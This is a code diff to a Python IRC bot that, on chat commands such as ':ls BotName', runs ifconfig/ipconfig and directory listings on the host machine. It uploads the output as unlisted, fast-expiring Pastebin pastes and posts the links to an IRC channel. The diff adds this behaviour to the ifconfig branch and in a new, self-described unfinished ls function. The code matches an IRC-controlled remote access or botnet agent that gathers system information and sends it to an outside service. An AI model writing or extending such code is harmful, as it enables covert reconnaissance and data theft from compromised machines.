@@ -100,7 +100,7 @@ def pslist(): # Function to list process names and pids
                   paste_expire_date = '10M')
     sendmsg(channel, url)
 
-def ifconfig():
+def ifconfig(): # Displays network interfaces
   if (str(platform.platform()))[0:3]=="Win":
     p = subprocess.Popen('ipconfig /all', shell=False, stdout=subprocess.PIPE)
     p.wait()
@@ -113,7 +113,35 @@ def ifconfig():
                   paste_expire_date = '10M')
     sendmsg(channel, url)
   else:
-    p = subprocess.Popen('ifconfig', shell = False, stdout=subprocess.PIPE)
+    p = subprocess.Popen('ifconfig', shell=False, stdout=subprocess.PIPE)
+    p.wait()
+    paste_code = p.stdout.read()
+    x = PastebinAPI()
+    url = x.paste(pastebin_api_key,
+                  paste_code,
+                  paste_name = 'ifconfig', 
+                  paste_private = 'unlisted',
+                  paste_expire_date = '10M')
+
+    sendmsg(channel, url)
+
+# Doesn't work yet :(
+def ls(dir): # Directory listing
+  if (str(platform.platform()))[0:3]=="Win":
+    
+    p = subprocess.Popen('dir', shell=False, stdout=subprocess.PIPE)
+    p.wait()
+    paste_code = p.stdout.read()
+    x = PastebinAPI()
+    url = x.paste(pastebin_api_key,
+                  paste_code,
+                  paste_name = 'ifconfig', 
+                  paste_private = 'unlisted',
+                  paste_expire_date = '10M')
+
+    sendmsg(channel, url)
+  else:
+    p = subprocess.Popen('ls -lahF', shell=False, stdout=subprocess.PIPE)
     p.wait()
     paste_code = p.stdout.read()
     x = PastebinAPI()
@@ -178,4 +206,7 @@ def main():
 
     if ircmsg.find(':pwd '+ botnick) != -1: # Calls pwd() if 'pwd BotName' is found
       pwd()
+
+    if ircmsg.find(':ls ' + botnick) != -1: # Calls pwd() if 'pwd BotName' is found
+      ls(directory)
 main()
